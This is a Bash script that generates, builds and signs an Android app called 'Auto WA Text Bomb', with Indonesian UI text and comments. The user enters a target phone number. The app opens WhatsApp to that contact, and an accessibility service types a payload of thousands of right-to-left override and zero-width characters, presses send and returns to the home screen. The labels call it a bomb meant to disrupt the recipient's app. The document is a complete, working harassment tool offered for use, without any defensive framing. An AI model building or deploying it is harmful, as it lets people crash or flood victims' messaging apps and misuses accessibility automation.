#!/usr/bin/env bash
# language: Bash, file: make-auto-wa-bomber.sh
set -Eeuo pipefail

ROOT="$(pwd)/auto-wa-bomber"
PKG="com.js.autowa"
PKG_DIR="$ROOT/app/src/main/java/com/js/autowa"
RES_DIR="$ROOT/app/src/main/res"

mkdir -p "$PKG_DIR" "$RES_DIR/values" "$RES_DIR/layout" "$RES_DIR/xml"
cd "$ROOT"

cat > settings.gradle.kts <<'EOF'
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
rootProject.name = "auto-wa-bomber"
include(":app")
EOF

cat > build.gradle.kts <<'EOF'
plugins {
    id("com.android.application") version "8.5.2" apply false
    id("org.jetbrains.kotlin.android") version "1.9.24" apply false
}
EOF

cat > app/build.gradle.kts <<'EOF'
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}
android {
    namespace = "com.js.autowa"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.js.autowa"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "1.0"
    }
    buildTypes { release { isMinifyEnabled = false } }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
}
EOF

cat > app/src/main/AndroidManifest.xml <<'EOF'
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
    <application
        android:allowBackup="false"
        android:label="Auto WA Sender"
        android:theme="@style/Theme.Material.Light">
        
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".WaBombService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>
    </application>
</manifest>
EOF

cat > "$RES_DIR/xml/accessibility_config.xml" <<'EOF'
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name" />
EOF

cat > "$RES_DIR/values/strings.xml" <<'EOF'
<resources><string name="app_name">Auto WA Sender</string></resources>
EOF

cat > "$RES_DIR/layout/activity_main.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="24dp"
    android:gravity="center_vertical">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Auto WA Text Bomb"
        android:textSize="22sp"
        android:textStyle="bold"
        android:layout_marginBottom="8dp"/>

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="PENTING: Aktifkan izin 'Aksesibilitas' untuk aplikasi ini di Pengaturan HP terlebih dahulu!"
        android:textColor="#FF0000"
        android:textSize="12sp"
        android:layout_marginBottom="16dp"/>

    <EditText
        android:id="@+id/etPhone"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:inputType="phone"
        android:hint="628123456789"
        android:background="@android:drawable/edit_text"
        android:padding="12dp"
        android:layout_marginBottom="24dp"/>

    <Button
        android:id="@+id/btnSend"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:text="Tembak Otomatis!"
        android:textSize="16sp"
        android:padding="12dp"/>

</LinearLayout>
EOF

cat > "$PKG_DIR/MainActivity.kt" <<'EOF'
package com.js.autowa

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val etPhone = findViewById<EditText>(R.id.etPhone)
        val btnSend = findViewById<Button>(R.id.btnSend)

        btnSend.setOnClickListener {
            val phone = etPhone.text.toString().trim()
            if (phone.isEmpty()) {
                Toast.makeText(this, "Nomor kosong!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val cleanPhone = phone.replace("[^0-9]".toRegex(), "")
            val finalPhone = if (cleanPhone.startsWith("0")) "62" + cleanPhone.substring(1) else cleanPhone

            // Buka WA ke nomor target
            val url = "https://api.whatsapp.com/send?phone=$finalPhone"
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.setPackage("com.whatsapp")
            
            try {
                // Set flag biar service tau ini bakal ngetik bom
                WaBombService.isBombing = true
                startActivity(intent)
            } catch (e: Exception) {
                Toast.makeText(this, "WhatsApp tidak ada!", Toast.LENGTH_SHORT).show()
            }
        }
    }
}
EOF

cat > "$PKG_DIR/WaBombService.kt" <<'EOF'
package com.js.autowa

import android.accessibilityservice.AccessibilityService
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

class WaBombService : AccessibilityService() {

    companion object {
        var isBombing = false
    }

    private val handler = Handler(Looper.getMainLooper())

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!isBombing) return
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: ""
            val className = event.className?.toString() ?: ""

            // Cek kalau yang kebuka adalah aplikasi WhatsApp
            if (packageName == "com.whatsapp") {
                
                // Kasih jeda 1.5 detik biar UI WA kelar loading
                handler.postDelayed({
                    val root = rootInActiveWindow
                    if (root != null) {
                        // 1. Cari kolom ketik (EditText)
                        val editTexts = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
                        if (editTexts != null && editTexts.isNotEmpty()) {
                            val editText = editTexts[0]
                            
                            // 2. Ketik teks bom
                            val payload = "\u202E".repeat(5000) + "\u200B".repeat(5000) + "\n\n💀 ERROR 💀"
                            val arguments = Bundle()
                            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, payload)
                            editText.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                            
                            // 3. Kasih jeda 1 detik biar teks selesai di-render, lalu klik Send
                            handler.postDelayed({
                                val sendButtons = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send")
                                if (sendButtons != null && sendButtons.isNotEmpty()) {
                                    sendButtons[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    Toast.makeText(this, "BOM TERKIRIM!", Toast.LENGTH_SHORT).show()
                                    
                                    // 4. Selesai, balik ke Home / tutup WA
                                    handler.postDelayed({
                                        performGlobalAction(GLOBAL_ACTION_BACK)
                                        performGlobalAction(GLOBAL_ACTION_HOME)
                                        isBombing = false
                                    }, 1000)
                                }
                            }, 1000)
                        }
                    }
                }, 1500)
            }
        }
    }

    override fun onInterrupt() {}
}
EOF

# Build & Sign
gradle wrapper --gradle-version 8.7 --distribution-type bin >/dev/null 2>&1 || true
if [[ -x ./gradlew ]]; then ./gradlew assembleRelease --no-daemon; else gradle assembleRelease --no-daemon; fi

APK_REL="$ROOT/app/build/outputs/apk/release/app-release-unsigned.apk"
APK_SIG="$ROOT/app/build/outputs/apk/release/app-release-signed.apk"
KEYSTORE="${HOME}/.android/debug.keystore"
[[ -f "$KEYSTORE" ]] || {
  mkdir -p "$(dirname "$KEYSTORE")"
  keytool -genkeypair -v -keystore "$KEYSTORE" -keyalg RSA -keysize 2048 -validity 10000 \
    -alias androiddebugkey -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US" >/dev/null 2>&1
}
BT="${ANDROID_HOME:-/opt/android-sdk}/build-tools/34.0.0"
if [[ -f "$APK_REL" ]]; then
  "$BT/apksigner" sign --ks "$KEYSTORE" --ks-pass pass:android --key-pass pass:android \
    --ks-key-alias androiddebugkey --out "$APK_SIG" "$APK_REL"
  echo "SUKSES: $APK_SIG"
fi
